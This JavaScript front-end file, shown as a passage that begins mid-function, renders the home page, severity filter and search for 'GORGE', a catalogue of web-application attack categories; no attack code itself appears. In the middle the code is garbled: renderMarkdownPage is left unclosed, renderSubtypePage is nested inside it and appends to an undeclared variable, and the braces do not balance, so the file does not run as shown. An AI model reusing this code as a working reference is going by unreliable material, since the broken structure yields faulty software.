    metas[i].classList.remove('active');
    var t = metas[i].textContent.trim().toLowerCase();
    if ((t === 'tools index' && hash === 'tools') || (t === 'lab environments' && hash === 'labs') ||
        (t === 'taxonomy' && hash === 'taxonomy') || (t === 'about' && hash === 'about') ||
        (t === 'changelog' && hash === 'changelog')) {
      metas[i].classList.add('active');
    }
  }
}

window.filterSeverity = function(severity, btn) {
  currentFilter = severity;
  var btns = document.querySelectorAll('.sidebar-filter-row .filter-btn');
  for (var i = 0; i < btns.length; i++) btns[i].classList.remove('active');
  btn.classList.add('active');
  var groups = document.querySelectorAll('.sidebar-cat-group');
  for (var i = 0; i < groups.length; i++) {
    groups[i].style.display = (severity === 'all' || groups[i].getAttribute('data-severity') === severity) ? 'block' : 'none';
  }
  if (currentPage === 'home') renderHomePage();
};

window.toggleSidebar = function() {
  document.getElementById('sidebar').classList.toggle('open');
};


/* ===== HOME PAGE ===== */
function renderHomePage() {
  var main = document.getElementById('mainContent');
  var h = renderLastUpdated('home');
  h += '<div class="stats-row">';
  h += '<div class="stat-card"><div class="stat-number">22</div><div class="stat-label">Categories</div></div>';
  h += '<div class="stat-card"><div class="stat-number">133</div><div class="stat-label">Attack Types</div></div>';
  h += '<div class="stat-card"><div class="stat-number">665+</div><div class="stat-label">Subtypes</div></div>';
  h += '<div class="stat-card"><div class="stat-number" style="font-size:18px;padding-top:4px;">WEB APP</div><div class="stat-label">current scope</div></div>';
  h += '</div>';

  var vc = 0;
  for (var i = 0; i < CATEGORIES.length; i++) {
    if (currentFilter === 'all' || CATEGORIES[i].severity === currentFilter) vc++;
  }
  h += '<div class="home-filter-row">';
  h += '<button class="filter-btn' + (currentFilter === 'all' ? ' active' : '') + '" onclick="filterSeverity(\'all\',this)">All</button>';
  h += '<button class="filter-btn' + (currentFilter === 'CRITICAL' ? ' active' : '') + '" onclick="filterSeverity(\'CRITICAL\',this)">Critical</button>';
  h += '<button class="filter-btn' + (currentFilter === 'HIGH' ? ' active' : '') + '" onclick="filterSeverity(\'HIGH\',this)">High</button>';
  h += '<button class="filter-btn' + (currentFilter === 'MEDIUM' ? ' active' : '') + '" onclick="filterSeverity(\'MEDIUM\',this)">Medium</button>';
  h += '<span class="filter-count">Showing ' + vc + ' of 22 categories</span>';
  h += '</div>';

  for (var i = 0; i < CATEGORIES.length; i++) {
    var cat = CATEGORIES[i];
    if (currentFilter !== 'all' && cat.severity !== currentFilter) continue;
    var bc = 'badge-' + cat.severity.toLowerCase();
    h += '<div class="category-card">';
    h += '<div class="category-card-header">';
    h += '<span class="cat-card-id">' + cat.id + '</span>';
    h += '<span class="cat-card-name">' + cat.name + '</span>';
    h += '<span class="' + bc + '">' + cat.severity + '</span>';
    h += '<span class="cat-card-types">' + cat.typeCount + ' types</span>';
    h += '<button class="cat-card-nav" onclick="event.stopPropagation();navigateTo(\'' + cat.slug + '\')">View</button>';
    h += '<span class="cat-card-arrow" id="card-arrow-' + cat.slug + '" onclick="event.stopPropagation();toggleCategoryCard(\'' + cat.slug + '\')">&#9654;</span>';
    h += '</div>';
    h += '<div class="category-card-body" id="card-body-' + cat.slug + '">';
    h += '<ul class="cat-subtype-list">';
    for (var j = 0; j < cat.types.length; j++) {
      h += '<li class="cat-subtype-item">' + escapeHtml(cat.types[j]) + '</li>';
    }
    h += '</ul>';
    h += '<div style="margin-top:12px"><a href="#' + cat.slug + '" onclick="navigateTo(\'' + cat.slug + '\');return false;" style="color:var(--red);font-size:12px;text-decoration:none;">View full category &#8594;</a></div>';
    h += '</div></div>';
  }
  main.innerHTML = h;
}

window.toggleCategoryCard = function(slug) {
  var body = document.getElementById('card-body-' + slug);
  var arrow = document.getElementById('card-arrow-' + slug);
  if (body.classList.contains('expanded')) {
    body.classList.remove('expanded');
    arrow.classList.remove('expanded');
  } else {
    body.classList.add('expanded');
    arrow.classList.add('expanded');
  }
};


/* ===== CATEGORY PAGE (FIX 3 -- stub handling) ===== */

function renderMarkdownPage(content) {
  var main = document.getElementById('mainContent');

function renderSubtypePage(catId, typeName, subtypeName, content) {

  h += '<a href="#home" onclick="navigateTo(\'home\');return false;">Home</a> &gt; ';

  main.innerHTML = h;
  postRender();
}

function renderMarkdown(text) {
  text = stripAIMetadata(text);
  text = stripShields(text);
  var html = marked.parse(text);
  html = processCollapsibles(html);
  return html;
}

function postRender() {
  setTimeout(function() {
    renderMermaid();
  }, 50);
}


/* ===== SEARCH ===== */
function initSearch() {
  var input = document.getElementById('searchInput');
  var timer = null;
  input.addEventListener('keyup', function(e) {
    if (e.key === 'Escape') { input.value = ''; handleRoute(); return; }
    clearTimeout(timer);
    timer = setTimeout(function() {
      var q = input.value.trim();
      if (q.length < 2) { handleRoute(); return; }
      handleSearch(q);
    }, 150);
  });
}

function handleSearch(query) {
  var results = [];
  var lq = query.toLowerCase();
  for (var i = 0; i < CATEGORIES.length; i++) {
    var cat = CATEGORIES[i];
    var cm = cat.name.toLowerCase().indexOf(lq) !== -1 || cat.id.toLowerCase().indexOf(lq) !== -1;
    if (cm) results.push({type:'category', cat:cat, match:cat.name});
    for (var j = 0; j < cat.types.length; j++) {
      if (cat.types[j].toLowerCase().indexOf(lq) !== -1) {
        results.push({type:'atype', cat:cat, match:cat.types[j]});
      }
    }
    if (cat.content && cat.content.toLowerCase().indexOf(lq) !== -1 && !cm) {
      var idx = cat.content.toLowerCase().indexOf(lq);
      var s = Math.max(0, idx - 40);
      var e = Math.min(cat.content.length, idx + query.length + 40);
      var snip = (s > 0 ? '...' : '') + cat.content.substring(s, e) + (e < cat.content.length ? '...' : '');
      results.push({type:'content', cat:cat, match:cat.name, snippet:snip});
    }
  }
  var pks = ['home','about','taxonomy','changelog','tools','labs'];
  var pns = {home:'Home',about:'About',taxonomy:'Taxonomy',changelog:'Changelog',tools:'Tools Index',labs:'Lab Environments'};
  for (var k = 0; k < pks.length; k++) {
    var key = pks[k];
    var pc = PAGES[key] || '';
    if (pc.toLowerCase().indexOf(lq) !== -1) {
      var idx = pc.toLowerCase().indexOf(lq);
      var s = Math.max(0, idx - 40);
      var e = Math.min(pc.length, idx + query.length + 40);
      var snip = (s > 0 ? '...' : '') + pc.substring(s, e) + (e < pc.length ? '...' : '');
      results.push({type:'page', page:key, match:pns[key], snippet:snip});
    }
  }
  renderSearchResults(query, results);
}

function renderSearchResults(query, results) {
  var main = document.getElementById('mainContent');
  document.title = 'GORGE | Search: ' + query;
  var h = '<div class="search-header">' + results.length + ' result' + (results.length !== 1 ? 's' : '') + ' for "<mark>' + escapeHtml(query) + '</mark>"</div>';
  if (results.length === 0) {
    h += '<p style="color:var(--text-muted);margin-top:20px">No matches found. Try a different search term.</p>';
    main.innerHTML = h;
    return;
  }
  var cats = [], types = [], conts = [], pages = [];
  for (var i = 0; i < results.length; i++) {
    var r = results[i];
    if (r.type === 'category') cats.push(r);
    else if (r.type === 'atype') types.push(r);
    else if (r.type === 'content') conts.push(r);
    else if (r.type === 'page') pages.push(r);
  }
  if (cats.length > 0) {
    h += '<div class="search-result-group"><div class="search-result-group-title">Categories</div>';
    for (var i = 0; i < cats.length; i++) {
      var r = cats[i];
      var bc = 'badge-' + r.cat.severity.toLowerCase();
      h += '<div class="search-result" onclick="navigateTo(\'' + r.cat.slug + '\')">';
      h += '<div class="search-result-name">' + highlightMatch(r.cat.name, query) + ' <span class="' + bc + '">' + r.cat.severity + '</span></div>';
      h += '<div class="search-result-path">' + r.cat.id + ' &middot; ' + r.cat.typeCount + ' types</div></div>';
    }
    h += '</div>';
  }
  if (types.length > 0) {
    h += '<div class="search-result-group"><div class="search-result-group-title">Attack Types</div>';
    for (var i = 0; i < types.length; i++) {
      var r = types[i];
      h += '<div class="search-result" onclick="navigateTo(\'' + r.cat.slug + '\')">';
      h += '<div class="search-result-name">' + highlightMatch(r.match, query) + '</div>';
      h += '<div class="search-result-path">' + r.cat.id + ' &middot; ' + r.cat.name + '</div></div>';
    }
    h += '</div>';
  }
  if (conts.length > 0) {
    h += '<div class="search-result-group"><div class="search-result-group-title">Content Matches</div>';
    for (var i = 0; i < conts.length; i++) {
      var r = conts[i];
      h += '<div class="search-result" onclick="navigateTo(\'' + r.cat.slug + '\')">';
      h += '<div class="search-result-name">' + r.cat.name + '</div>';
      h += '<div class="search-result-path">' + highlightMatch(r.snippet, query) + '</div></div>';
    }
    h += '</div>';
  }
  if (pages.length > 0) {
    h += '<div class="search-result-group"><div class="search-result-group-title">Pages</div>';
    for (var i = 0; i < pages.length; i++) {
      var r = pages[i];
      h += '<div class="search-result" onclick="navigateTo(\'' + r.page + '\')">';
      h += '<div class="search-result-name">' + highlightMatch(r.match, query) + '</div>';
      h += '<div class="search-result-path">' + highlightMatch(r.snippet, query) + '</div></div>';
    }
    h += '</div>';
  }
  main.innerHTML = h;
}

function highlightMatch(text, query) {
  if (!query) return escapeHtml(text);
  var esc = escapeHtml(text);
  var re = new RegExp('(' + escapeRegex(escapeHtml(query)) + ')', 'gi');
  return esc.replace(re, '<mark>$1</mark>');
}
